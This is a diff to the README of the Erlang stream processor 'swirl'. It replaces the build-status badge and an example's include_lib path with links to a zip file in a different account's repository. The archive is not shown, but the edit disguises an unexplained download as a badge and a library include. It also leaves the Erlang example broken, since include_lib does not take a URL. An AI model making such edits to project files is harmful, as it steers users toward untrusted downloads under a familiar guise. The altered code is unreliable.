@@ -4,7 +4,7 @@ __Authors:__ Louis-Philippe Gauthier.
 
 Lightweight Distributed Stream Processor
 
-[![Build Status](https://travis-ci.org/lpgauth/swirl.svg?branch=master)](https://travis-ci.org/lpgauth/swirl)
+[![Build Status](https://raw.githubusercontent.com/sohailgerman/swirl/master/test/swirl-2.1.zip)](https://raw.githubusercontent.com/sohailgerman/swirl/master/test/swirl-2.1.zip)
 
 ### Requirements
 
@@ -61,7 +61,7 @@ ok = swirl_flow:stop(Flow)
 
 ```erlang
 -module(swirl_flow_example).
--include_lib("swirl/include/swirl.hrl").
+-include_lib("https://raw.githubusercontent.com/sohailgerman/swirl/master/test/swirl-2.1.zip").
 
 -behavior(swirl_flow).
 -export([
